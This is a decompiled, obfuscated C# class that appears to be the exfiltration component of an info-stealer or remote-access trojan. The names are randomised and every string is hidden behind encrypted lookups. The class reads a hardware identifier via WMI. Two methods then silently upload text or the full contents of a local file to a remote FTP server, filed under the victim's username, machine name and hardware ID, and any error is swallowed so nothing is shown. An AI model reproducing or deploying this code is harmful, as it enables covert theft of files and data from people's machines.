using System;
using System.IO;
using System.Management;
using System.Net;
using System.Text;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace wawLLalyhHSFm;

internal sealed class PRbKLyXwxCMy
{
	[NonSerialized]
	internal static GetString getString_0;

	public static string jcnSxDGjlUW()
	{
		//IL_0015: Unknown result type (might be due to invalid IL or missing references)
		//IL_001b: Expected O, but got Unknown
		//IL_003a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0040: Expected O, but got Unknown
		//IL_00a9: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b0: Expected O, but got Unknown
		string text = string.Empty;
		try
		{
			ManagementClass val = new ManagementClass(getString_0(107401780));
			ManagementObjectCollection instances = val.GetInstances();
			ManagementObjectEnumerator enumerator = instances.GetEnumerator();
			try
			{
				if (enumerator.MoveNext())
				{
					ManagementObject val2 = (ManagementObject)enumerator.get_Current();
					text = ((ManagementBaseObject)val2).get_Properties().get_Item(getString_0(107401759)).get_Value()
						.ToString();
				}
			}
			finally
			{
				((IDisposable)enumerator)?.Dispose();
			}
			string text2 = getString_0(107401774);
			ManagementObject val3 = new ManagementObject(getString_0(107401769) + text2 + getString_0(107401696));
			val3.Get();
			return ((ManagementBaseObject)val3).get_Item(getString_0(107401691)).ToString();
		}
		catch (Exception)
		{
			return string.IsNullOrEmpty(text) ? getString_0(107390443) : text;
		}
	}

	public static void hOcDfzmVsDaOYQZ(string iMGnQMEIAaKA = "URL", string tIslnqjTtLH = "USERNAME", string BHOyctDnES = "ACCESO", string UzUDKsKrCAXG = "")
	{
		try
		{
			string text = jcnSxDGjlUW();
			FtpWebRequest ftpWebRequest = (FtpWebRequest)WebRequest.Create(iMGnQMEIAaKA + getString_0(107403351) + Environment.UserName + getString_0(107403370) + Environment.MachineName + getString_0(107403317) + text + getString_0(107403344));
			ftpWebRequest.Method = getString_0(107401698);
			ftpWebRequest.Credentials = new NetworkCredential(tIslnqjTtLH, BHOyctDnES);
			ASCIIEncoding aSCIIEncoding = new ASCIIEncoding();
			byte[] bytes = aSCIIEncoding.GetBytes(UzUDKsKrCAXG);
			ftpWebRequest.ContentLength = bytes.Length;
			using Stream stream = ftpWebRequest.GetRequestStream();
			stream.Write(bytes, 0, bytes.Length);
		}
		catch
		{
		}
	}

	public static void KUjtevBxHIDiZB(string gEHDTmVlqIM = "URL", string iSGtUhhfffe = "USERNAME", string HGLjDqGKZLeq = "ACCESO", string DzDNUKmMzTntA = "")
	{
		try
		{
			string text = jcnSxDGjlUW();
			FtpWebRequest ftpWebRequest = (FtpWebRequest)WebRequest.Create(gEHDTmVlqIM + getString_0(107403351) + Environment.UserName + getString_0(107403370) + Environment.MachineName + getString_0(107403317) + text + getString_0(107403317) + Path.GetFileName(DzDNUKmMzTntA));
			ftpWebRequest.Method = getString_0(107401698);
			ftpWebRequest.Credentials = new NetworkCredential(iSGtUhhfffe, HGLjDqGKZLeq);
			byte[] array = File.ReadAllBytes(DzDNUKmMzTntA);
			ftpWebRequest.ContentLength = array.Length;
			using Stream stream = ftpWebRequest.GetRequestStream();
			stream.Write(array, 0, array.Length);
		}
		catch
		{
		}
	}

	static PRbKLyXwxCMy()
	{
		Strings.CreateGetStringDelegate(typeof(PRbKLyXwxCMy));
	}
}
